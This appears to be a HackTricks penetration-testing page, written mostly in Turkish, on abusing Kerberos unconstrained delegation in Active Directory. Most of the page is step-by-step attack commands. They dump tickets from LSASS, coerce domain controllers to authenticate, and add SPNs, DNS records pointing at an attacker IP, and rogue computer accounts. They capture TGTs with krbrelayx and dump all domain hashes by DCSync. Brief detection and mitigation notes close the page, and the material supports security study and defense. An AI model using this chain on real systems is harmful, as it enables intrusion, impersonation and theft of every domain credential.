# Unconstrained delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, bir Domain Administrator'ın domain içindeki herhangi bir **Computer** için ayarlayabileceği bir özelliktir. Ardından, bir **user Computer'da oturum açtığında**, o kullanıcının **TGT kopyası**, DC tarafından sağlanan **TGS'nin içinde gönderilir** ve **LSASS belleğine kaydedilir**. Dolayısıyla makinede Administrator ayrıcalıklarına sahipseniz, **ticket'ları dump edebilir ve kullanıcıları** herhangi bir makinede **taklit edebilirsiniz**.

Bu nedenle, "Unconstrained Delegation" özelliği etkinleştirilmiş bir Computer'da bir domain admin oturum açarsa ve o makinede local admin ayrıcalıklarına sahipseniz, ticket'ı dump edebilir ve Domain Admin'i her yerde taklit edebilirsiniz (domain privesc).

[ userAccountControl ](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) özniteliğinin [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek bu özniteliğe sahip **Computer** nesnelerini **bulabilirsiniz**. Bunu, powerview'in kullandığı ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresiyle yapabilirsiniz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator (veya victim user) ticket'ını **Mimikatz** veya [**Pass the Ticket**](pass-the-ticket.md) için **Rubeus** ile belleğe yükleyin.\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team'de Unconstrained delegation hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Bir saldırgan **"Unconstrained Delegation" için izin verilen bir bilgisayarı compromise edebilirse**, bir **Print server**'ı **otomatik olarak** bu bilgisayara karşı **login olmaya** ve sunucunun belleğinde bir TGT **saklamaya** **ikna edebilir**.\
Ardından saldırgan, Print server bilgisayar hesabını **taklit etmek** için bir **Pass the Ticket attack** gerçekleştirebilir.

Bir print server'ın herhangi bir makineye karşı login olmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT bir domain controller'dan geliyorsa, bir [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) gerçekleştirebilir ve DC'deki tüm hash'leri elde edebilirsiniz.\
[**Bu attack hakkında ired.team'de daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Burada **force an authentication** için diğer yöntemleri bulabilirsiniz:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Victim'ın **Kerberos** kullanarak unconstrained-delegation host'unuza authenticate olmasını sağlayan diğer tüm coercion primitive'leri de çalışır. Modern ortamlarda bu, genellikle hangi RPC surface'inin erişilebilir olduğuna bağlı olarak classic PrinterBug flow'unu **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** veya **WebClient/WebDAV** tabanlı coercion ile değiştirmek anlamına gelir.

### Unconstrained delegation kullanan bir user/service account'u abuse etme

Unconstrained delegation **computer object'leriyle sınırlı değildir**. Bir **user/service account** da `TRUSTED_FOR_DELEGATION` olarak yapılandırılabilir. Bu senaryoda pratik gereksinim, account'un sahip olduğu bir **SPN** için Kerberos service ticket'ları almasıdır.

Bu, oldukça yaygın 2 offensive path'e yol açar:

1. Unconstrained-delegation **user account**'ının password/hash'ini compromise edersiniz, ardından aynı account'a **SPN** eklersiniz.
2. Account'un zaten bir veya daha fazla SPN'i vardır, ancak bunlardan biri **stale/decommissioned hostname**'e işaret eder; eksik **DNS A record**'unu yeniden oluşturmak, SPN set'ini değiştirmeden authentication flow'unu hijack etmek için yeterlidir.<sup>[[8]](#references)</sup>

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notlar:

- Bu, özellikle unconstrained principal bir **service account** olduğunda ve bir domain’e katılmış host üzerinde code execution yerine yalnızca kimlik bilgilerine sahip olduğunuzda oldukça kullanışlıdır.
- Hedef kullanıcıda zaten **stale SPN** varsa, AD içine yeni bir SPN yazmaktansa ilgili **DNS record**'unu yeniden oluşturmak daha az gürültülü olabilir.
- Recent Linux-centric tradecraft uses `addspn.py`, `dnstool.py`, `krbrelayx.py`, and one coercion primitive; chain'i tamamlamak için bir Windows host'a dokunmanız gerekmez.

### Saldırgan tarafından oluşturulan bir bilgisayarla Unconstrained Delegation'ı kötüye kullanma

Modern domain'lerde genellikle `MachineAccountQuota > 0` bulunur (varsayılan değer 10); bu da herhangi bir authenticated principal'ın N adede kadar computer object oluşturmasına olanak tanır. Ayrıca `SeEnableDelegationPrivilege` token privilege'ına (veya eşdeğer haklara) sahipseniz, yeni oluşturulan bilgisayarı unconstrained delegation için trusted olacak şekilde ayarlayabilir ve privileged system'lerden gelen inbound TGT'leri toplayabilirsiniz.<sup>[[1]](#references)</sup>

Üst düzey akış:

1) Kontrol ettiğiniz bir computer oluşturun
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Sahte hostname'i domain içinde çözümlenebilir hale getirin
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Saldırganın kontrolündeki bilgisayarda Unconstrained Delegation'ı etkinleştirin
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Neden çalışır: unconstrained delegation ile delegation-enabled bilgisayardaki LSA, gelen TGT'leri önbelleğe alır. Bir DC'yi veya privileged server'ı sahte host'unuza authenticate olmaya ikna ederseniz, makinenin TGT'si depolanır ve dışa aktarılabilir.

4) krbrelayx'i export mode'da başlatın ve Kerberos materyalini hazırlayın
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/sunucuların sahte host'unuza kimlik doğrulaması yapmasını zorlayın
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx, bir makine kimlik doğrulaması gerçekleştirdiğinde ccache dosyalarını kaydeder, örneğin:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) DCSync gerçekleştirmek için ele geçirilen DC machine TGT'sini kullanın
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0`, ayrıcalıksız bilgisayar oluşturmayı etkinleştirir; aksi durumda açık izinler gerekir.
- Bir bilgisayarda `TRUSTED_FOR_DELEGATION` ayarlamak, `SeEnableDelegationPrivilege` (veya domain admin) gerektirir.
- Sahte host'unuz için ad çözümlemesini (DNS A kaydı) sağlayın; böylece DC ona FQDN üzerinden ulaşabilir.
- Coercion, kullanılabilir bir vector gerektirir (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN vb.). Mümkünse bunları DC'lerde devre dışı bırakın.
- Mağdur hesabı **"Account is sensitive and cannot be delegated"** olarak işaretlenmişse veya **Protected Users** üyesiyse, iletilen TGT service ticket'a dahil edilmez; bu nedenle bu chain yeniden kullanılabilir bir TGT sağlamaz.<sup>[[9]](#references)</sup>
- Kimlik doğrulaması yapan client/server üzerinde **Credential Guard** etkinse Windows, **Kerberos unconstrained delegation** özelliğini engeller; bu durum normalde geçerli olan coercion path'lerinin operator açısından başarısız olmasına neden olabilir.

Detection ve hardening fikirleri:

- UAC `TRUSTED_FOR_DELEGATION` ayarlandığında Event ID 4741 (bilgisayar hesabı oluşturuldu) ve 4742/4738 (bilgisayar/kullanıcı hesabı değiştirildi) olayları için alert oluşturun.
- Domain zone içinde yapılan olağandışı DNS A-record eklemelerini monitor edin.
- Beklenmeyen host'lardan gelen 4768/4769 artışlarını ve DC'lerin DC olmayan host'lara yaptığı authentication işlemlerini izleyin.
- `SeEnableDelegationPrivilege` yetkisini minimum bir grupla sınırlandırın, mümkün olan yerlerde `MachineAccountQuota=0` ayarlayın ve DC'lerde Print Spooler'ı devre dışı bırakın. LDAP signing ve channel binding uygulayın.

### Mitigation

- DA/Admin login işlemlerini belirli service'lerle sınırlandırın.
- Ayrıcalıklı hesaplar için "Account is sensitive and cannot be delegated" ayarını etkinleştirin.

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
